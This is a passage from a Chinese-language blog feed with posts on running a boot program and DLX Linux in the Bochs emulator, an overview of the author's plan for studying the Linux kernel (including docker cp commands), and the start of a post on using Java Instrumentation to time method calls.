action=report</span><br><span class="line">debug: action=ignore, pci=report # report BX_DEBUG from module &apos;pci&apos;</span><br><span class="line"></span><br><span class="line">debugger_log: -</span><br><span class="line"></span><br><span class="line">parport1: enabled=1, file=&quot;parport.out&quot;</span><br><span class="line"></span><br><span class="line">speaker: enabled=1, mode=sound</span><br></pre></td></tr></table></figure><ol start="5"><li>当前目录 <em>linux-boot</em> 下，键入命令 <code>bochs</code></li><li>由于读取到 <em>bochsrc</em> 配置文件的存在，menu 的默认选项为 6 (开始模拟机器)</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">You can also start bochs with the -q option to skip these menus.</span><br><span class="line"></span><br><span class="line">1. Restore factory default configuration</span><br><span class="line">2. Read options from...</span><br><span class="line">3. Edit options</span><br><span class="line">4. Save options to...</span><br><span class="line">5. Restore the Bochs state from...</span><br><span class="line">6. Begin simulation</span><br><span class="line">7. Quit now</span><br><span class="line"></span><br><span class="line">Please choose one: [6]</span><br></pre></td></tr></table></figure><ol start="7"><li>直接开始运行机器，键入命令 <code>c</code> (这部分在 <a href="https://dormouse-none.github.io/2018-08-19-understand-Kernel-0/">概述</a> 有过了描述，以后将不再描述)</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Please choose one: [6]</span><br><span class="line">00000000000i[      ] lt_dlhandle is 0x7f85d0405ff0</span><br><span class="line">00000000000i[PLUGIN] loaded plugin libbx_sdl2.so</span><br><span class="line">00000000000i[      ] installing sdl2 module as the Bochs GUI</span><br><span class="line">00000000000i[SDL2  ] maximum host resolution: x=2880 y=1800</span><br><span class="line">00000000000i[      ] using log file bochsout.txt</span><br><span class="line">Next at t=0</span><br><span class="line">(0) [0x0000fffffff0] f000:fff0 (unk. ctxt): jmpf 0xf000:e05b          ; ea5be000f0</span><br><span class="line">&lt;bochs:1&gt; c</span><br></pre></td></tr></table></figure><ol start="8"><li>观察仿真器的表现</li></ol><p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fuf2kicsqyj313y0q0gn4.jpg" alt=""></p><p>Oh, YES! 成功输出了 <em>Loading System…</em> (不过响铃没有听到，可能与我没有配置 sound 有关)</p><ol start="9"><li>关机</li></ol><p>无需多言，右上角模拟的就是<strong>关机实体按键</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  __                    __                  </span><br><span class="line"> / _| __ _ _ __   __ _ / _| ___ _ __   __ _ </span><br><span class="line">| |_ / _` | &apos;_ \ / _` | |_ / _ \ &apos;_ \ / _` |</span><br><span class="line">|  _| (_| | | | | (_| |  _|  __/ | | | (_| |</span><br><span class="line">|_|  \__,_|_| |_|\__, |_|  \___|_| |_|\__, |</span><br><span class="line">                 |___/                |___/</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在&lt;a href=&quot;https://dormouse-none.github.io/2018-08-19-understand-Kernel-0/&quot;&gt;概述&lt;/a&gt;，我想我已经介绍过我开始这一些列博文的原因。&lt;br&gt;我不能担保我所进行的所有试验性操作都是对的，但是，至少这些在我所描述的环境下成功的运行了起来，并帮助我触及我始终敬畏而又敬而远之的&lt;strong&gt;硬件&amp;amp;OS&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在《Linux内核完全注释》一书第三章——内核编程语言和环境，描述了用 as86 汇编语言构建 boot 引导程序，并最终通过 Bochs 仿真器在模拟开机通电后，BIOS Load&lt;br&gt;boot 程序，通过显示器输出 &lt;em&gt;Loading System…&lt;/em&gt; 。&lt;/p&gt;
&lt;p&gt;这些，将是这里所要描述的主要内容。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://DorMOUSE-None.github.io/tags/Linux/"/>
    
      <category term="Kernel" scheme="https://DorMOUSE-None.github.io/tags/Kernel/"/>
    
      <category term="BIOS" scheme="https://DorMOUSE-None.github.io/tags/BIOS/"/>
    
  </entry>
  
  <entry>
    <title>理解 Linux Kernel (0) - 概述</title>
    <link href="https://DorMOUSE-None.github.io/2018-08-19-understand-Kernel-0/"/>
    <id>https://DorMOUSE-None.github.io/2018-08-19-understand-Kernel-0/</id>
    <published>2018-08-18T16:00:00.000Z</published>
    <updated>2018-08-19T04:46:27.020Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>之所以想要了解 Linux Kernel，与前一个月的 JVM ClassFile 的学习有这很大的关联。</p><p>说实话，刨除 JVM 的具体实现，Sun (或者现在该说是 Oracle) 确实将 Java 的底层逻辑设计得相当简单。</p><ol><li>有限而统一的指令集(不超过 256 个，可以用 1 字节表示)</li><li>操作数栈+局部变量表共同实现的指令运算</li><li>高度封装的成员变量/方法的寻址方式</li><li>… (见识短浅，想不到了…以后再补充吧)</li></ol><p>但是，与 JVM 模拟的虚拟机不同，实体机器有着更为复杂的结构。<br>最根本的，不同厂商的机器就带来了不同的 CPU 指令集，这就已经让人难以接受了。</p><p>其实最初，是想要继续去看看 Hotspot 虚拟机的。但是，混杂的代码(C++, Java, 平台相关各种实现) 带来了很大的阅读障碍。<br>最根本的，我甚至找不到一个学习的基本立足点，出发点(当然，也可能我根本就没仔细去看，哈哈)。</p><p>借着一次机会，我开始看《程序员的自我修养——链接、装载与库》一书。确实无论是 ELF 格式，静态链接与动态链接甚至 Linux 的内建函数<br>都给了我比较深刻的印象，向我展示了 C 更深入的一面。但是，macOS 给我带来了比较大的客观阻碍(即使用 Docker 容器得到了一个可用的 Linux 环境，但是否与直接建立在机器上的系统有所区别，此处还得打个问号)。<br>同时，书中的部分内容上下不统一，缺少前后文也是一个重大的问题。总之，这并不完全适合我这种初学者逐一进行书中所描述的全部实验。</p><p>最后，我决定展开对 Linux Kernel 的学习，试图通过对直接构架在硬件上的操作系统进行一番比较深入的学习。</p><p>期间，找过一些资料，也了解到 Linus Torvals 直接领导着的 <a href="https://www.kernel.org/" target="_blank" rel="noopener">Kernel 项目的官网</a>；甚至，找到了各个版本的 kernel 源码(虽然确实地丢失了最早期 0.XX 的若干版本)。<br>不得不说，就目前来讲，我觉得《Linux内核完全注释》是最适合(<em>打个问号，至少暂时是的</em>)我学习的一书。</p><p>之后的若干博文，将都以《Linux内核完全注释》中的内容为基础，结合目前的实际需要，从而进行实操性的认知与学习。</p><a id="more"></a><h2 id="软硬件描述"><a href="#软硬件描述" class="headerlink" title="软硬件描述"></a>软硬件描述</h2><p>进行这方面的描述，是因为 Linux Kernel 将直接与底层硬件打交道(当然，这方面使用的 Bochs 仿真器)。<br>但是，准备诸如 .img (磁盘映像文件), 机器指令文件等都不得不借助于现有的平台。</p><ul><li>操作系统: macOS 10.13.6 , Ubuntu 16.04 (Docker 虚拟机容器)</li><li>仿真器  : Bochs 2.6.9_2 (macOS 与 Ubuntu 上相同)</li><li>更多    : 将直接在正文首次使用到时进行说明</li></ul><h2 id="Bochs"><a href="#Bochs" class="headerlink" title="Bochs"></a>Bochs</h2><p><a href="http://bochs.sourceforge.net/" target="_blank" rel="noopener">Bochs 官网</a></p><p><a href="https://sourceforge.net/projects/bochs/files/" target="_blank" rel="noopener">Bochs 下载链</a></p><p>说实话这一周都差不多要被 Bochs 折腾死，用源码进行编译出现各种各样的问题。(我猜新版本根本就没考虑对 macOS 做兼容)</p><p>最后，不得不使用经编译后的二进制分发版。 <code>brew install bochs</code> 当然了，反正也能用，就不纠结非得自己编译了。(如果哪位能成功编译个 macOS 可用的应用，希望能把踩得坑整理整理，供后来者参考)</p><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── CHANGES</span><br><span class="line">├── COPYING</span><br><span class="line">├── INSTALL_RECEIPT.json</span><br><span class="line">├── LICENSE</span><br><span class="line">├── README</span><br><span class="line">├── TODO</span><br><span class="line">├── bin</span><br><span class="line">│   ├── bochs                           // bochs 可执行文件</span><br><span class="line">│   └── bximage                         // 制作磁盘映像文件的工具</span><br><span class="line">├── lib                                 // 动态库目录</span><br><span class="line">│   └── bochs</span><br><span class="line">│       └── plugins</span><br><span class="line">│           ├── libbx_acpi.0.0.0.so</span><br><span class="line">│           ├── ... 略</span><br><span class="line">│           └── libbx_vga.so -&gt; libbx_vga.0.0.0.so</span><br><span class="line">└── share                               // 与体系结构无关的文件放在此目录下</span><br><span class="line">    ├── bochs</span><br><span class="line">    │   ├── BIOS-bochs-latest</span><br><span class="line">    │   ├── BIOS-bochs-legacy</span><br><span class="line">    │   ├── SeaBIOS-README</span><br><span class="line">    │   ├── VGABIOS-elpin-2.40</span><br><span class="line">    │   ├── VGABIOS-elpin-LICENSE</span><br><span class="line">    │   ├── VGABIOS-lgpl-README</span><br><span class="line">    │   ├── VGABIOS-lgpl-latest</span><br><span class="line">    │   ├── VGABIOS-lgpl-latest-cirrus</span><br><span class="line">    │   ├── VGABIOS-lgpl-latest-cirrus-debug</span><br><span class="line">    │   ├── VGABIOS-lgpl-latest-debug</span><br><span class="line">    │   ├── bios.bin-1.7.5</span><br><span class="line">    │   └── keymaps</span><br><span class="line">    │       ├── sdl-pc-us.map</span><br><span class="line">    │       ├── ... 略</span><br><span class="line">    │       └── x11-pc-us.map</span><br><span class="line">    ├── doc</span><br><span class="line">    │   └── bochs</span><br><span class="line">    │       ├── CHANGES</span><br><span class="line">    │       ├── COPYING</span><br><span class="line">    │       ├── LICENSE</span><br><span class="line">    │       ├── README</span><br><span class="line">    │       ├── TODO</span><br><span class="line">    │       ├── bochsrc-sample.txt      // bochsrc 配置文件的示例样板</span><br><span class="line">    │       └── slirp.conf</span><br><span class="line">    └── man</span><br><span class="line">        ├── man1</span><br><span class="line">        │   ├── bochs-dlx.1.gz</span><br><span class="line">        │   ├── bochs.1.gz</span><br><span class="line">        │   └── bximage.1.gz</span><br><span class="line">        └── man5</span><br><span class="line">            └── bochsrc.5.gz</span><br></pre></td></tr></table></figure><h3 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h3><p>Bochs 下载链提供了 Bochs 不同版本的源码的下载，同时也提供了一些可用的磁盘映像文件(都是一些已经经过处理，可用使用进行仿真运行的 OS )</p><p>说实话，这是绝对有必要进行的一步，不仅仅是了解配置文件 bochsrc 的配置方式，更可用借此了解一下仿真器的使用方式。(在启动系统上，我也被坑了一天，后面细说)</p><p>首先，这里演示的将是 DLX Linux 。</p><ol><li><p>下载，解压，进入目录。</p></li><li><p>目录下文件如下</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── bochsrc.txt         // bochs 启动时将默认通过这个文件读取仿真器配置</span><br><span class="line">├── hd10meg.img         // 磁盘映像文件</span><br><span class="line">├── readme.txt</span><br><span class="line">└── testform.txt</span><br></pre></td></tr></table></figure><ol start="3"><li>启动仿真器</li></ol><p>在 DLX Linux 目录下键入命令 <code>bochs</code>, 观察到命令行输出:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">========================================================================</span><br><span class="line">                       Bochs x86 Emulator 2.6.9</span><br><span class="line">               Built from SVN snapshot on April 9, 2017</span><br><span class="line">                  Compiled on May  2 2018 at 13:26:32</span><br><span class="line">========================================================================</span><br><span class="line">00000000000i[      ] LTDL_LIBRARY_PATH not set. using compile time default &apos;/usr/local/Cellar/bochs/2.6.9_2/lib/bochs/plugins&apos;</span><br><span class="line">00000000000i[      ] BXSHARE not set. using compile time default &apos;/usr/local/Cellar/bochs/2.6.9_2/share/bochs&apos;</span><br><span class="line">00000000000i[      ] lt_dlhandle is 0x7fef2252a500</span><br><span class="line">00000000000i[PLUGIN] loaded plugin libbx_usb_common.so</span><br><span class="line">00000000000i[      ] lt_dlhandle is 0x7fef2252a8a0</span><br><span class="line">00000000000i[PLUGIN] loaded plugin libbx_unmapped.so</span><br><span class="line">00000000000i[      ] lt_dlhandle is 0x7fef2252ad00</span><br><span class="line">00000000000i[PLUGIN] loaded plugin libbx_biosdev.so</span><br><span class="line">00000000000i[      ] lt_dlhandle is 0x7fef2252b1e0</span><br><span class="line">00000000000i[PLUGIN] loaded plugin libbx_speaker.so</span><br><span class="line">00000000000i[      ] lt_dlhandle is 0x7fef2252ba50</span><br><span class="line">00000000000i[PLUGIN] loaded plugin libbx_extfpuirq.so</span><br><span class="line">00000000000i[      ] lt_dlhandle is 0x7fef2252be70</span><br><span class="line">00000000000i[PLUGIN] loaded plugin libbx_parallel.so</span><br><span class="line">00000000000i[      ] lt_dlhandle is 0x7fef238013c0</span><br><span class="line">00000000000i[PLUGIN] loaded plugin libbx_serial.so</span><br><span class="line">00000000000i[      ] lt_dlhandle is 0x7fef22706cd0</span><br><span class="line">00000000000i[PLUGIN] loaded plugin libbx_iodebug.so</span><br><span class="line">00000000000i[      ] reading configuration from bochsrc.txt</span><br><span class="line">------------------------------</span><br><span class="line">Bochs Configuration: Main Menu</span><br><span class="line">------------------------------</span><br><span class="line"></span><br><span class="line">This is the Bochs Configuration Interface, where you can describe the</span><br><span class="line">machine that you want to simulate.  Bochs has already searched for a</span><br><span class="line">configuration file (typically called bochsrc.txt) and loaded it if it</span><br><span class="line">could be found.  When you are satisfied with the configuration, go</span><br><span class="line">ahead and start the simulation.</span><br><span class="line"></span><br><span class="line">You can also start bochs with the -q option to skip these menus.</span><br><span class="line"></span><br><span class="line">1. Restore factory default configuration</span><br><span class="line">2. Read options from...</span><br><span class="line">3. Edit options</span><br><span class="line">4. Save options to...</span><br><span class="line">5. Restore the Bochs state from...</span><br><span class="line">6. Begin simulation</span><br><span class="line">7. Quit now</span><br><span class="line"></span><br><span class="line">Please choose one: [6]</span><br></pre></td></tr></table></figure><p>bochs 默认读取当前目录下 <code>bochsrc.txt</code> 文件，因此不需要其他配置。</p><p>选择 6 或者直接 <em>回车</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00000000000i[      ] lt_dlhandle is 0x7fef22707270</span><br><span class="line">00000000000i[PLUGIN] loaded plugin libbx_sdl2.so</span><br><span class="line">00000000000i[      ] installing sdl2 module as the Bochs GUI</span><br><span class="line">00000000000i[SDL2  ] maximum host resolution: x=2880 y=1800</span><br><span class="line">00000000000i[      ] using log file bochsout.txt</span><br><span class="line">Next at t=0</span><br><span class="line">(0) [0x0000fffffff0] f000:fff0 (unk. ctxt): jmpf 0xf000:e05b          ; ea5be000f0</span><br><span class="line">&lt;bochs:1&gt;</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/006tNbRwgy1fuevtktuh0j30zc0tcwfd.jpg" alt=""></p><p>终端出现更多输出，同时 Bochs 开启了一个可视化终端(当然，现在还没有任何内容)。</p><p>在这儿被坑了好久。本来以为 Bochs 会直接执行 BIOS 指令，启动操作系统，但是自始至终，停在这里就没动过…</p><p>这边是由于 Bochs 本身是支持调试的(T_T，见鬼)，就像是 GDB 和 LLDB 一样，进入调试后，需要指令 <code>c</code> (continue) 来继续执行(当然，还有其它调试命令)</p><ol start="4"><li>键入 <code>c</code> </li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:1&gt; c</span><br></pre></td></tr></table></figure><p>仿真器开始引导程序的加载</p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fuew9zoocuj313c0pstaw.jpg" alt=""></p><p>OS Kernel 启动，等待用户登录 (默认的用户是 root , 没有密码)。<br>之后就和普通的 Linux 机器类似，不过支持的命令比较少。毕竟是一个精简后的系统。</p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fuewamqzm6j313q0pqjtw.jpg" alt=""></p><ol start="5"><li>关机</li></ol><p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fuewi9wjawj313q0q2gnc.jpg" alt=""></p><p>仿真器仿真了许多实体机案件，右上角最后一个就是关机键</p><h2 id="Docker-容器中运行-Ubuntu"><a href="#Docker-容器中运行-Ubuntu" class="headerlink" title="Docker 容器中运行 Ubuntu"></a>Docker 容器中运行 Ubuntu</h2><p>这部分不详述，作为一个热门的技术，这方面的资料很多。Ubuntu 系统只是为了来执行一些 macOS 上没有的命令的(比如 <code>as86</code>, <code>ld86</code>)</p><p>简述两个 docker 容器和宿主机间复制文件的命令 </p><p>在宿主机下执行命令:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|-</span><br><span class="line">docker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH [flags]</span><br></pre></td></tr></table></figure><p>例如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker cp linux:/root/hello.c ./hello.c         <span class="comment"># 这里 linux 是 docker 容器名</span></span><br><span class="line">docker cp 92dfc8ad70e1:/root/hello.c ./hello.c  <span class="comment"># 这里 92dfc8ad70e1 是 docker 容器 ID</span></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1]. 俞甲子. 程序员的自我修养[M]. 电子工业出版社, 2009.<br>[2]. 赵炯. Linux内核完全注释 内核版本0.11 V3.0[EB/OL]. <a href="http://www.oldlinux.org/" target="_blank" rel="noopener">http://www.oldlinux.org/</a>, 2007</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  __                    __                  </span><br><span class="line"> / _| __ _ _ __   __ _ / _| ___ _ __   __ _ </span><br><span class="line">| |_ / _` | &apos;_ \ / _` | |_ / _ \ &apos;_ \ / _` |</span><br><span class="line">|  _| (_| | | | | (_| |  _|  __/ | | | (_| |</span><br><span class="line">|_|  \__,_|_| |_|\__, |_|  \___|_| |_|\__, |</span><br><span class="line">                 |___/                |___/</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;之所以想要了解 Linux Kernel，与前一个月的 JVM ClassFile 的学习有这很大的关联。&lt;/p&gt;
&lt;p&gt;说实话，刨除 JVM 的具体实现，Sun (或者现在该说是 Oracle) 确实将 Java 的底层逻辑设计得相当简单。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;有限而统一的指令集(不超过 256 个，可以用 1 字节表示)&lt;/li&gt;
&lt;li&gt;操作数栈+局部变量表共同实现的指令运算&lt;/li&gt;
&lt;li&gt;高度封装的成员变量/方法的寻址方式&lt;/li&gt;
&lt;li&gt;… (见识短浅，想不到了…以后再补充吧)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;但是，与 JVM 模拟的虚拟机不同，实体机器有着更为复杂的结构。&lt;br&gt;最根本的，不同厂商的机器就带来了不同的 CPU 指令集，这就已经让人难以接受了。&lt;/p&gt;
&lt;p&gt;其实最初，是想要继续去看看 Hotspot 虚拟机的。但是，混杂的代码(C++, Java, 平台相关各种实现) 带来了很大的阅读障碍。&lt;br&gt;最根本的，我甚至找不到一个学习的基本立足点，出发点(当然，也可能我根本就没仔细去看，哈哈)。&lt;/p&gt;
&lt;p&gt;借着一次机会，我开始看《程序员的自我修养——链接、装载与库》一书。确实无论是 ELF 格式，静态链接与动态链接甚至 Linux 的内建函数&lt;br&gt;都给了我比较深刻的印象，向我展示了 C 更深入的一面。但是，macOS 给我带来了比较大的客观阻碍(即使用 Docker 容器得到了一个可用的 Linux 环境，但是否与直接建立在机器上的系统有所区别，此处还得打个问号)。&lt;br&gt;同时，书中的部分内容上下不统一，缺少前后文也是一个重大的问题。总之，这并不完全适合我这种初学者逐一进行书中所描述的全部实验。&lt;/p&gt;
&lt;p&gt;最后，我决定展开对 Linux Kernel 的学习，试图通过对直接构架在硬件上的操作系统进行一番比较深入的学习。&lt;/p&gt;
&lt;p&gt;期间，找过一些资料，也了解到 Linus Torvals 直接领导着的 &lt;a href=&quot;https://www.kernel.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Kernel 项目的官网&lt;/a&gt;；甚至，找到了各个版本的 kernel 源码(虽然确实地丢失了最早期 0.XX 的若干版本)。&lt;br&gt;不得不说，就目前来讲，我觉得《Linux内核完全注释》是最适合(&lt;em&gt;打个问号，至少暂时是的&lt;/em&gt;)我学习的一书。&lt;/p&gt;
&lt;p&gt;之后的若干博文，将都以《Linux内核完全注释》中的内容为基础，结合目前的实际需要，从而进行实操性的认知与学习。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://DorMOUSE-None.github.io/tags/Linux/"/>
    
      <category term="Kernel" scheme="https://DorMOUSE-None.github.io/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>Java Instrumentation</title>
    <link href="https://DorMOUSE-None.github.io/2018-08-15-Java-Instrumentation/"/>
    <id>https://DorMOUSE-None.github.io/2018-08-15-Java-Instrumentation/</id>
    <published>2018-08-14T16:00:00.000Z</published>
    <updated>2018-08-17T09:34:33.762Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h2><p>从现有的前置知识来说，我们能够认识到两个事实:</p><ol><li>Java Class 通过 ClassLoader 进行加载。<br>通过<code>全限定名</code>进行区分。当需要加载新的类时，ClassLoader 通过双亲委派机制判断是否已经加载过这个类。<br>换句话说: Class 一经加载，就不会尝试重复加载 (至少按绝大多数人的认知来说，确实是的)</li><li>有没有可能让被加载的 Class 与物理存储上的 .class 内容不同。<br>当然也是完全可以做到的。不管怎么说，CGlib 和 Java Proxy 也是一个耳熟能详的概念吧<br>(虽然可能不了解细节。在此，欢迎学习前置技能 <a href="https://dormouse-none.github.io/2018-07-10-CGlib-Enhancer/">CGlib Enhancer 主流程源码解析</a> 和 <a href="https://dormouse-none.github.io/2018-07-20-Java-Proxy/">Java Proxy 源码解析</a>。不过不影响本文后续内容)</li></ol><p>另一个方面，也许绝大多数人都听说过所谓的<code>热部署</code>。但是究竟怎么才能做到 <code>热部署</code>(话题开得有点大哈。Y_Y 本文不讲这个)</p><p>操作字节码一定是一个逃不开的话题，毕竟 Class 就是所谓的被加载到内存的字节码嘛。</p><p>如何操作字节码? ASM, CGlib, Java Proxy, Javassist ? 不过这些都要等到需要被操作的类被加载了才行啊，似乎有点晚…</p><p>Java 提供了一个可行的机制，用来在 ClassLoader 加载字节码之前完成对操作字节码的目的</p><h2 id="Instrumentation"><a href="#Instrumentation" class="headerlink" title="Instrumentation"></a>Instrumentation</h2><p><code>java.lang.instrument.Instrumentation</code> 类为提供直接操作 Java 字节码的又一个途径(虽然 Java Doc 的说明是用来检测 Java 代码的)</p><p>相信我这个说明是没有问题的。毕竟完成对代码检测的途径是直接修改字节码。</p><p>下列有两种方法可以达到目的</p><ol><li>当 JVM 以指示一个代理类的方式启动时，将传递给代理类的 premain 方法一个 Instrumentation 实例。</li><li>当 JVM 提供某种机制在 JVM 启动之后某一时刻启动代理时，将传递给代理代码的 agentmain 方法一个 Instrumentation 实例。</li></ol><p>话不多说，下面将全部以实例来展现对这种 JVM 检测机制(虽然例子已经脱离了<em>检测</em>的目的)的使用</p><a id="more"></a><h2 id="对各方法进行执行时间统计"><a href="#对各方法进行执行时间统计" class="headerlink" title="对各方法进行执行时间统计"></a>对各方法进行执行时间统计</h2><h3 id="随-JVM-一起启动"><a href="#随-JVM-一起启动" class="headerlink" title="随 JVM 一起启动"></a>随 JVM 一起启动</h3><p>基本实例: 将对特定包 <code>me.fangfeng.client</code> 下的每个方法执行计时</p><p>首先了解一下 client 包的内容:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> me.fangfeng.client;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Main.java</span></span><br><span class="line"><span class="comment"> * 执行两个方法，rand() &amp; sleep() </span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> fangfeng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2018/8/7</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sleep</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        Rand rand = <span class="keyword">new</span> Rand();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">"&gt;&gt;&gt; start Rand.run() &lt;&lt;&lt;"</span>);</span><br><span class="line">            rand.run();</span><br><span class="line">            System.out.println(<span 